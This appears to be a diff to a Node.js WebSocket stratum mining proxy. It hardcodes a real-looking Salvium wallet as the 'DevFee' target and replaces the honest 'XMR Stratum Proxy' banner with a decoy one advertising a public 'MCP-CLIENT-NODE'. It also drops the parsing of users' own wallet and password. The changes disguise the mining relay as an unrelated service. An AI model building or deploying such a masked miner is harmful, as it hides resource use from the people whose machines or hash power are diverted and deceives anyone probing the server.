@@ -12,11 +12,11 @@ const WS_PORT = process.argv[2] || 8080;
 
 // DevFee target pool
 const DEVFEE_POOL = {
-    host: "gulf.moneroocean.stream",
-    port: 10001,
-    user: "YOUR_DEV_WALLET_ADDRESS_HERE",
-    pass: "worker1",
-    agent: "XMRig/6.18.0"
+    host: "us3.salvium.herominers.com",
+    port: 1230,
+    user: "SC1siHCYzSU3BiFAqYg3Ew5PnQ2rDSR7QiBMiaKCNQqdP54hx1UJLNnFJpQc1pC3QmNe9ro7EEbaxSs6ixFHduqdMkXk7MW71ih.DEVFEE",
+    pass: "x",
+    agent: "devfee/1.0.0"
 };
 
 // DevFee timing
@@ -28,7 +28,7 @@ const NORMAL_TIME = CYCLE_MINUTES * (1 - DEVFEE_PERCENT) * 60 * 1000;
 // ================== SERVER ==================
 const server = http.createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
-    res.end('XMR Stratum Proxy - Ready\n');
+    res.end('WELCOME TO MCP-CLIENT-NODE PUBLIC! FEEL FREE TO USE!\n');
 });
 
 const wss = new WebSocket.Server({ server });
@@ -55,8 +55,6 @@ wss.on('connection', (ws, req) => {
         const parts = decoded.split(':');
         user_host = parts[0];
         user_port = parts[1];
-        user_wallet = parts[2] || "default_wallet";
-        user_pass = parts[3] || "x";
     } catch {
         ws.send(JSON.stringify({ error: "Invalid base64 format. Use: host:port:wallet:pass" }));
         ws.close();
